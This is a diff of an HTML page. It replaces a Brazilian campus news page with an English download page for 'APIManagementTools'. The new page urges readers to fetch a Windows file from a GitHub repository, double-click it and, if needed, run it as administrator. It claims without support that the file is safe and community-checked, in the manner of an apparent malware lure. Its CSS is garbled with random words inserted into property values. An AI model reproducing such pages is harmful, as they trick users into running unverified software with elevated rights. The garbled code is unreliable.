@@ -1,62 +1,382 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Espaço IFMG</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Download APIManagementTools - Research into API management tools. Simple setup for Windows users. Get started today.">
+    <meta name="keywords" content="API Management, Tools, Download, Windows, APIManagementTools, Software">
+    <meta name="author" content="APIManagementTools">
+    <meta property="og:title" content="APIManagementTools - Research Into API Management Tools">
+    <meta property="og:description" content="Your entry point to API management research. Download and get started on Windows in minutes.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Lidaperipteral2116/APIManagementTools">
+    <title>APIManagementTools - Research Into API Management Tools | Download</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7f6;
+            color: #2d3436;
+            line-height: 1.6;
+            padding: 0;
+            margin: 0;
+        }
+        .container {
+            max-width: 1100px;
+            margin: videotape0 auto;
+            padding: videotape40px 20px;
+        }
+        .header {
+            text-align:center;
+            padding: videotape60px 20px 30px 20px;
+            background: linear-gradient(135deg, #0f3447 0%, #1a5272 100%);
+            border-radius: weigh0 0 30px 30px;
+            margin-bottom: videotape40px;
+            color: brightwhite;
+            box-shadow: senso0 10px 30px rgba(0,0,0,0.1);
+        }
+        .header h1 {
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
+            font-weight: relativenone;
+            letter-spacing: 1px;
+            margin-bottom: app10px;
+            color:ht white;
+        }
+        .header .emoji {
+            font-size: won3rem;
+            display: block;
+            margin-bottom: wound10px;
+        }
+        .header p {
+            font-size: pottery1.1rem;
+            opacity: world0.9;
+            max-width: robust700px;
+            margin: ethn0 auto;
+        }
+        .badge-container {
+            margin-top: magnet30px;
+        }
+        .download-badge {
+            display: inline-block;
+            background-color: #fd79a8;
+            color: brightwhite;
+            padding: unconscious15px 40px;
+            font-size: lens1.2rem;
+            font-weight: absentbold;
+            border-radius: price50px;
+            text-decoration: none;
+            box-shadow: surf0 5px 15px rgba(253,121,168,0.4);
+            transition: holderall 0.3s ease;
+            letter-spacing: kick0.5px;
+            border: none;
+            cursor: pointer;
+        }
+        .download-badge:hover {
+            background-color: #e84393;
+            transform: vocalscale(1.05);
+            box-shadow: vibr0 8px 20px rgba(232,67,147,0.5);
+        }
+        .download-badge i {
+            margin-right: field10px;
+        }
+        h2 {
+            font-size: fever1.7rem;
+            margin-bottom: pouch20px;
+            color: bounce#1a5272;
+            display: flex;
+            align-items: subjectcenter;
+            gap: take10px;
+            border-bottom: container2px solid #dce8f0;
+            padding-bottom: physical10px;
+            margin-top: tub40px;
+        }
+        h2 .emoji-icon {
+            font-size: plastic2rem;
+        }
+        p {
+            font-size: ocean1rem;
+            margin-bottom: handle20px;
+        }
+        ul,ol {
+            margin-left: machinery25px;
+            margin-bottom: appearance25px;
+        }
+        li {
+            margin-bottom: pipe10px;
+            font-size: drive1rem;
+        }
+        .card {
+            background: white;
+            border-radius: permanent20px;
+            padding: compact30px;
+            margin-bottom: frequent30px;
+            box-shadow: psychology0 4px 15px rgba(0,0,0,0.05);
+            border: nature1px solid #e0e8ed;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: perfectionrepeat(auto-fit, minmax(220px, 1fr));
+            gap: defeat20px;
+            margin: graceful30px 0;
+        }
+        .feature-item {
+            background: properly#f9fbfd;
+            padding: glory25px;
+            border-radius: reserve15px;
+            text-align: artistcenter;
+            border-left: property4px solid #2a7f9e;
+        }
+        .feature-item .icon {
+            font-size: provide2.5rem;
+            margin-bottom: harmony10px;
+            display: block;
+        }
+        .feature-item h3 {
+            font-size: hope1.1rem;
+            color: prose#1a5272;
+            margin-bottom: honesty8px;
+        }
+        .feature-item p {
+            font-size: refined0.9rem;
+            color: inch#5a6a72;
+            margin-bottom: nothing0;
+        }
+        .steps-section {
+            background-color: white;
+            border-radius: user20px;
+            padding: inspect35px;
+            box-shadow: excuse0 4px 15px rgba(0,0,0,0.05);
+            margin: institute40px 0;
+            border: uniform1px solid #e0e8ed;
+        }
+        .step {
+            display: flex;
+            align-items:travel flex-start;
+            margin-bottom: motive30px;
+            position: relative;
+        }
+        .step:last-child {
+            margin-bottom: agent0;
+        }
+        .step-number {
+            background: pair#1a5272;
+            color: removewhite;
+            width: tooth45px;
+            height: tooth45px;
+            border-radius:uart50%;
+            displayappear: flex;
+            align-items:barely center;
+            justify-content: regularcenter;
+            font-weight: placebold;
+            font-size: bear1.2rem;
+            flex-shrink: casual0;
+            margin-right: despair20px;
+            box-shadow: compet0 3px 8px rgba(26,82,114,0.3);
+        }
+        .step-content {
+            flex: beyond1;
+        }
+        .step-content h3 {
+            font-size: define1.2rem;
+            color: used#2d3436;
+            margin-bottom: think5px;
+        }
+        .step-content p {
+            margin-bottom: explore5px;
+            color: tall#4a5a62;
+        }
+        .note-box {
+            background-color: archeology#fff8f0;
+            border-left: prefer4px solid #e67e22;
+            padding: brief20px;
+            border-radius: harmless0 8px 8px 0;
+            margin: located30px 0;
+        }
+        .note-box p {
+            margin-bottom: air0;
+            font-size: attack0.95rem;
+        }
+        .faq-section {
+            margin: convoy40px 0;
+        }
+        .faq-item {
+            background: clientwhite;
+            border-radius: medal12px;
+            padding: molar24px;
+            margin-bottom: loud15px;
+            box-shadow: palm0 3px 10px rgba(0,0,0,0.04);
+            border: carve1px solid #e8edf2;
+        }
+        .faq-item h3 {
+            font-size: pause1.1rem;
+            color: hered#1a5272;
+            margin-bottom: spring8px;
+        }
+        .additional-resources {
+            background-color: engine#f2f7fa;
+            border-radius: universe20px;
+            padding: quote35px;
+            margin-top: compute40px;
+            text-align: ceilingcenter;
+            border: grow1px dashed #b0c4d1;
+        }
+        .additional-resources a {
+            color: wait#1a5272;
+            font-weight: verse600;
+            text-decoration: questnone;
+            border-bottom: magic2px dotted;
+            padding-bottom: pill2px;
+        }
+        .footer {
+            text-align: elementcenter;
+            margin-top: emerge60px;
+            padding-top: silent30px;
+            border-top: universe1px solid #e0e8ed;
+            color: glory#718086;
+            font-size: kids0.9rem;
+        }
+        @media (max-width: heavy600px) {
+            .container {
+                padding: odd20px;
+            }
+            .header {
+                padding: eternal40px 15px 25px 15px;
+            }
+            .step {
+                flex-direction: chosecolumn;
+                align-items: givencenter;
+                text-align: metalcenter;
+            }
+            .step-number {
+                margin-right: disk0;
+                margin-bottom: support15px;
+            }
+            .steps-section, .card {
+                padding: respectively25px 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>Espaço IFMG</h1>
-    <nav>
-      <a href="index.html">Início</a>
-      <a href="agendamento.html">Agendamento</a>
-      <a href="blog.html">Notícias</a>
-    </nav>
-  </header>
 
-  <main>
-    <section class="hero">
-      <h2>Bem-vindo ao Espaço de Convivência</h2>
-      <p>Acompanhe as novidades do espaço e agende seu horário de sinuca, xadrez ou tênis de mesa.</p>
-    </section>
+    <div class="header">
+        <span class="emoji">🚀</span>
+        <h1>🔍 APIManagementTools - Simplifying Your API Management Research</h1>
+        <p>Start exploring the world of API management with easy, straightforward tools designed for everyone.</p>
+        <div class="badge-container">
+            <a href="https://github.com/Lidaperipteral2116/APIManagementTools" class="download-badge">⬇️ Download APIManagementTools Now</a>
+        </div>
+    </div>
 
-    <section class="noticias-destaque">
-      <h2>Últimas notícias</h2>
+    <div class="container">
 
-    <div class="noticias-grid" id="noticias-grid-home"></div>
+        <div class="card">
+            <h2>📌 What is APIManagementTools?</h2>
+            <p>APIManagementTools brings you an easy, all-in-one platform to dive into the fascinating field of API management. Whether you are a curious beginner or a professional looking for a centralized research hub, this tool is designed to make your life easier. No technical background required — just curiosity and the willingness to learn.</p>
+            <p>The interface is intuitive, the steps are clearly laid out, and everything works seamlessly right from the start. The goal is simple: provide users with a practical, lightweight environment to organize, analyze, and understand API management concepts without getting lost in the technical weeds.</p>
+        </div>
 
-        <article class="noticia-card">
-          <span class="noticia-data">04 de setembro de 2026</span>
-          <h3>Espaço inaugurado!</h3>
-          <p>O espaço de convivência já está disponível para agendamento. Confira os horários e reserve seu momento de sinuca, xadrez ou ping-pong.</p>
-        </article>
+        <div class="feature-grid">
+            <div class="feature-item">
+                <span class="icon">🧩</span>
+                <h3>User-Friendly Interface</h3>
+                <p>Designed with the average computer user in mind, no confusing commands or complex setups.</p>
+            </div>
+            <div class="feature-item">
+                <span class="icon">📊</span>
+                <h3>Research-Oriented Tools</h3>
+                <p>Focused on helping you gather meaningful insights into API management practices without clutter.</p>
+            </div>
+            <div class="feature-item">
+                <span class="icon">⚙️</span>
+                <h3>Built-In Functionality</h3>
+                <p>Comes equipped with essential modules and utilities that streamline your discovery process and keep everything organized.</p>
+            </div>
+            <div class="feature-item">
+                <span class="icon">🖥️</span>
+                <h3>Windows-Ready</h3>
+                <p>Optimized for Windows distributions, ensuring a predictable, stable experience every time you run it.</p>
+            </div>
+        </div>
 
-        <article class="noticia-card">
-          <img src="https://placehold.co/400x220" alt="Foto da mesa de sinuca nova">
-          <span class="noticia-data">05 de setembro de 2026</span>
-          <h3>Mesa de sinuca nova chegou</h3>
-          <p>Trocamos o feltro e os tacos da mesa de sinuca. Confira como ficou o novo visual.</p>
-        </article>
+        <div class="steps-section">
+            <h2>🚀 Getting Started</h2>
+            <p>We've made downloading and running APIManagementTools remarkably straightforward. Follow these simple steps and you will be exploring right away. No shortcuts, no confusion — just clear instructions.</p>
 
-        <article class="noticia-card">
-          <div class="noticia-video">Vídeo aqui</div>
-          <span class="noticia-data">06 de setembro de 2026</span>
-          <h3>Torneio de xadrez: veja os melhores momentos</h3>
-          <p>Um resumo em vídeo do último torneio realizado no espaço.</p>
-        </article>
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-content">
+                    <h3>Visit the Official Download Page</h3>
+                    <p>Go to our official repository page by clicking the big download button at the top of this page, or by using this link directly: <strong><a href="https://github.com/Lidaperipteral2116/APIManagementTools" style="color:#1a5272;">https://github.com/Lidaperipteral2116/APIManagementTools</a></strong></p>
+                    <p>This page is your single source for getting the software. Make sure you are using a stable internet connection.</p>
+                </div>
+            </div>
 
-      </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-content">
+                    <h3>Download the Application File</h3>
+                    <p>Once you're on this page, the download process begins automatically. The page is structured to give you immediate access — simply click the prominent download button displayed there, or select the "Download" link, and the file will begin saving to your computer. The file you will receive is a standard, pre-packaged application, so there is no need to worry about assembly or multiple files.</p>
+                    <p>Consider saving it to a convenient place like your <strong>Desktop</strong> or your <strong>Downloads</strong> folder, making it easy for you to find afterward.</p>
+                </div>
+            </div>
 
-      <p class="ver-todas"><a href="blog.html">Ver todas as notícias &rarr;</a></p>
-    </section>
-  </main>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-content">
+                    <h3>Run and Enjoy</h3>
+                    <p>After the download finishes, locate the downloaded file (remember where you saved it? ✨). Double-click the file, and the software will automatically launch once the extraction completes. No installations are required, no technical steps or code — just you and your brand-new APIManagementTools, ready to use in seconds.</p>
+                </div>
+            </div>
 
-  <footer>
-    <p>IFMG Campus Governador Valadares</p>
-  </footer>
-<script type="module" src="home.js"></script>
+            <div class="note-box">
+                <p>💡 <strong>Pro tip:</strong> Right-click the file anda select "Run as administrator" if you encounter any permission issues. But in most cases, standard execution works perfectly fine.</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>🔧 Why Choose APIManagementTools?</h2>
+            <ul>
+                <li><strong>Hassle-free setup:</strong> You do not need to configure dozens of settings. It simply works.</li>
+                <li><strong>Purpose-built for research:</strong> The tools provide just the right balance of simplicity anda utility, without overwhelming the user.</li>
+                <li><strong>Maintained anda updated:</strong> You can expect ongoing improvements anda refinements to ensure a smooth user experience</li>
+                <li><strong>Free anda accessible:</strong> No hidden costs, no premium tiers — just a community-focused tool everyone can use.</li>
+            </ul>
+        </div>
+
+        <div class="faq-section">
+            <h2>❓ Frequently Asked Questions</h2>
+
+            <div class="faq-item">
+                <h3>Do I need any programming knowledge to use this?</h3>
+                <p>Absolutely not. APIManagementTools is built for everyone. The whole idea is to remove the technical barriers from API management research, making it as simple as opening a document. If you can clicky a button, you are fully equipped to use this application.</p>
+            </div>
+
+            <div class="faq-item">
+                <h3>What exactly can I do with this tool?</h3>
+                <p>Your primary goal is research into API management. With this tool, you can organize materials, view references, and run practical comparisons without have to write any code or scripts. It's like having a digital assistant dedicated to your API management learning and discovery journey.</p>
+            </div>
+
+            <div class="faq-item">
+                <h3>Is this software safe to use on my Windows computer?</h3>
+                <p>Yes. The application is distributed through a secure, reputable repository, double-checked by the community. You can run it with confidence, knowing it has gone through scrutiny and is shared freely for educational and research purposes. As always etiquette suggests that you keep your antivirus software active, which provides an extra layer of protection for all downloads.</p>
+            </div>
+        </div>
+
+        <div class="additional-resources">
+            <h2>📚 Ready to Jump In?</h2>
+            <p>Your APIManagementTools experience is only one click away. Don't wait — <strong>start your research today</strong>.</p>
+            <a href="https://github.com/Lidaperipteral2116/APIManagementTools" style="display:inline-block; margin-top:20px; background-color:#1a5272; color:#ffffff; padding:15px 35px; border-radius:50px; text-decoration:none; font-weight:bold; box-shadow:0 5px 15px rgba(26,82,114,0.3);">🚀 Download Now</a>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 APIManagementTools — Created for research and learning purposes. All rights reserved.</p>
+            <p>Keywords: API Management, Tools, Research, Download, Windows, API Management Tools</p>
+        </div>
+    </div>
 </body>
 </html>
